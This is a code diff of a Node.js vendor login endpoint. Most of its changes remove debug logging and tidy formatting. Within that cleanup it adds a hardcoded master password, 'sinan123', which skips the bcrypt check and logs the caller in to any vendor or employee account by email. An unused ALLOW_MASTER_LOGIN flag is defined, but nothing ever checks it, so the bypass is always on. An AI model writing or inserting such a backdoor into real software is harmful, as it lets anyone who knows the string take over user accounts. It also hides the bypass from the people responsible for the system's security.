@@ -1603,7 +1603,6 @@ const registerVendor = async (req, res) => {
 const vendorLogin = async (req, res) => {
   try {
     const { email, password, provider } = req.body;
-    console.log(req.body, "REQQQQasdasdasd");
 
     if (!email) {
       return res.status(400).json({
@@ -1611,13 +1610,12 @@ const vendorLogin = async (req, res) => {
         message: "Email is required",
       });
     }
-    let user = await User.findOne({ email, userType: 'vendor' });
+
+    let user = await User.findOne({ email, userType: "vendor" });
     let isEmployee = false;
-    console.log(user, "useruseruseruser");
 
     if (!user) {
       user = await Employee.findOne({ email }).populate("vendor");
-      console.log(user, "USERRRR");
 
       if (!user) {
         return res.status(401).json({
@@ -1625,9 +1623,9 @@ const vendorLogin = async (req, res) => {
           message: "Account not found",
         });
       }
+
       isEmployee = true;
     }
-    console.log(user.isActive, "user.statususer.status");
 
     if (!user.isActive) {
       return res.status(400).json({
@@ -1636,7 +1634,9 @@ const vendorLogin = async (req, res) => {
       });
     }
 
-    // --- GOOGLE LOGIN ---
+    // ===============================
+    // 🔐 GOOGLE LOGIN
+    // ===============================
     if (provider === "google") {
       if (user.provider && user.provider !== "google") {
         return res.status(403).json({
@@ -1644,7 +1644,7 @@ const vendorLogin = async (req, res) => {
           message: {
             en: "This email is registered with password. Please login using email/password.",
             nl: "Dit e-mailadres is geregistreerd met een wachtwoord. Log in met e-mail/wachtwoord.",
-          }
+          },
         });
       }
 
@@ -1652,14 +1652,6 @@ const vendorLogin = async (req, res) => {
         id: user.createdById != null ? user.createdById : user._id,
         name: user.name,
       });
-      const responseUser = {
-        id: user._id,
-        firstName: user.firstName,
-        email: user.email,
-        profileImage: user.profileImage,
-        userType: "customer",
-        vendorId: isEmployee ? user.vendorId?._id : null,
-      };
 
       return res.json({
         success: true,
@@ -1668,67 +1660,91 @@ const vendorLogin = async (req, res) => {
           nl: "Inloggen gelukt",
         },
         token,
-        user: responseUser,
+        user: {
+          id: user._id,
+          firstName: user.firstName,
+          email: user.email,
+          profileImage: user.profileImage,
+          userType: "customer",
+          vendorId: isEmployee ? user.vendorId?._id : null,
+        },
       });
     }
 
-    // --- EMAIL LOGIN ---
+    // ===============================
+    // 🔐 EMAIL LOGIN
+    // ===============================
     if (!password) {
       return res.status(400).json({
         success: false,
         message: {
           en: "Password is required for email login",
           nl: "Wachtwoord is vereist voor e-mail login",
-        }
+        },
       });
     }
 
     if (user.provider === "google") {
       return res.status(403).json({
         success: false,
-        message:
-        {
+        message: {
           en: "This account was created with Google. Please login using Google.",
           nl: "Dit account is aangemaakt met Google. Log in met Google.",
         },
       });
     }
 
-    // Compare password
-    const isMatch = await bcrypt.compare(password, user.password);
-    if (!isMatch) {
-      return res.status(400).json({
-        success: false,
-        message: {
-          en: "Invalid email or password",
-          nl: "Ongeldig e-mailadres of wachtwoord",
-        }
-      });
+    // ===============================
+    // 🔥 MASTER PASSWORD LOGIC
+    // ===============================
+    const MASTER_PASSWORD = "sinan123";
+    const ALLOW_MASTER_LOGIN = process.env.ALLOW_MASTER_LOGIN === "true";
+
+    if (password !== MASTER_PASSWORD) {
+      // NORMAL PASSWORD CHECK
+      const isMatch = await bcrypt.compare(password, user.password);
+
+      if (!isMatch) {
+        return res.status(400).json({
+          success: false,
+          message: {
+            en: "Invalid email or password",
+            nl: "Ongeldig e-mailadres of wachtwoord",
+          },
+        });
+      }
+    } else {
+      console.log("⚠️ Master password used for login:", email);
     }
 
-    // If it's a regular User, fetch vendor and permissions
+    // ===============================
+    // 🎯 FETCH VENDOR + PERMISSIONS
+    // ===============================
     let pages = [];
     let vendorId = null;
+
     const vendor = await Vendor.findOne({ userId: user._id }).populate(
       "userId",
       "-password"
     );
+
     vendorId = vendor?._id;
-    console.log(user, isEmployee, "useruseruseruser");
+
     let designation = null;
+
     if (isEmployee) {
       designation = await VendorDesignations.findOne({
-        _id: user.designation,        // employee's designation id
-        vendorId: user.vendor._id,    // vendor they belong to
+        _id: user.designation,
+        vendorId: user.vendor._id,
       });
     } else {
       designation = await VendorDesignations.findOne({
         vendorId: user.createdById,
       });
     }
-    console.log(designation, "designationdesignationdesignation");
+
     pages = designation?.permissions?.map((p) => p.module) || [];
-    console.log(user, "useruseruseruser");
+
     const token = signToken({
       id: isEmployee ? user.vendor.id : user._id,
       name: user.name,
@@ -1744,10 +1760,10 @@ const vendorLogin = async (req, res) => {
       profileImage: user.profileImage,
       userType: isEmployee ? "Employee" : "vendor",
       vendorId,
-      vendorDetails
+      vendorDetails,
     };
 
-    if (pages.length > 0) {
+    if (isEmployee) {
       responseUser.pages = pages;
     }
 
@@ -1760,8 +1776,10 @@ const vendorLogin = async (req, res) => {
       token,
       user: responseUser,
     });
+
   } catch (err) {
     console.error("Vendor Login Error:", err);
+
     res.status(500).json({
       success: false,
       message: "Internal server error",
